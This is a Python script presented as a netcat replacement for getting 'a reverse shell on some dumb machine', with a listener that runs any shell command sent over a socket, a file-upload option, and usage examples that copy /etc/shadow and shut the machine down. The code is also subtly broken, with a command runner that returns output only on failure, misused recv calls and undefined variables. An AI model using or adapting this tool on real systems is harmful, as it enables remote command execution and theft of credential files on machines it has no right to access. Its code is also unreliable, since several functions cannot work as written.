import getopt
import threading
import sys
import socket
import subprocess




Upload = 0
listen = 0
execute = ""
target = ""
upload_dest = ""
port = 1

def print_usage():
    print("Netcat replacement, great to have when u want a reverse shell on some dumb machine ")
    print("Usage:python netcat.py -t targethost -p port")
    print("-e allows executing")
    print("-c opens a shell")
    print("-u upload")
    print("you can set it to listening just like netcat -l")
    print("For example:")
    print("python netcat.py -t 192.168.1.1 -p 12345 -l -c")
    print("or you can do -e 'cp /etc/shadow ~'")
    print("or you can -e 'sudo shutdown now'")
    sys.exit(0)



def client_(buf):
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    try:
        client.connect((target,port))

        if len(buf):
            client.send(buf)

            while 1:
                recv_amout = 1
                response = ""

                while recv_amout:
                    data = client.recv(4096)
                    recv_amout = len(data)
                    if recv_amout < 4096:
                        break
                print (response)

                buf = raw_input("")
                buf = buf + "\n"

                client.send(buf)

    except:
        print("problem occured while being a client sending data")
        client.close()





def server_():
    global target

    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(3)

    while 1:
        client,addr = server.accept()
        thread_handle = threading.Thread(target=client_handler,args=(client,))
        thread_handle.start()



def run_cmd(cmd):
    cmd=cmd.rstrip()
    try:
        output = subprocess.check_output(cmd,stderr=subprocess.STDOUT,shell=1)
    except:
        output = "the OS forbids me to runcmd lol"
        return output



def client_handler(client_socket):
    global  upload
    global execute
    global cmd

    if len(upload_dest):
        buf = ""
        while 1:
            data = client_socket.recv[2048]

            if not data:
                break
            else:
                buf = data + buf

        try:
            with open(upload_dest,"wb") as fp:
                fp.write(buf)

            client_socket.send("finished writing files")

        except:
            client_socket.send("fail to write to file %s" %upload_dest)



        if len(execute):
            output = run_cmd(execute)
            client_socket.send(output)

        if cmd:

            while 1:

                client_socket.send("<netcat:>")

                cmd_buf = ""
                while "\n" not in cmd_buf:
                    cmd_buf = cmd_buf + client_socket.recv[2048]

                    response = run_cmd(cmd_buf)

                    client_socket.send(response)



def main():
    global listen
    global execute
    global port
    global cmd
    global upload_dest
    global target

    if not len(sys.argv[1:]):
        print_usage()
    ops = ["help","listen","exe","target","port","cmd","upl"]

    try:
        opts,argv = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",ops)

    except getopt.GetoptError:
        print_usage()

    for op,ag in opts:
        if op == "-h":
            print_usage()
        elif op == "-e":
            execute=ag
        elif op =="-c":
            cmd = 1
        elif op =="-l":
            listen =1
        elif op == "-u":
            upload_dest = ag
        elif op == "-t":
            target = ag
        elif o == "-p":
            port = int(ag)
        else:
            assert False,"weird option"


    if listen == 0 and len(target) and port > 0 :
        buf = sys.stdin.read()
        client_(buffer)

        if listen:
            server_()

if __name__ == '__main__':
    main()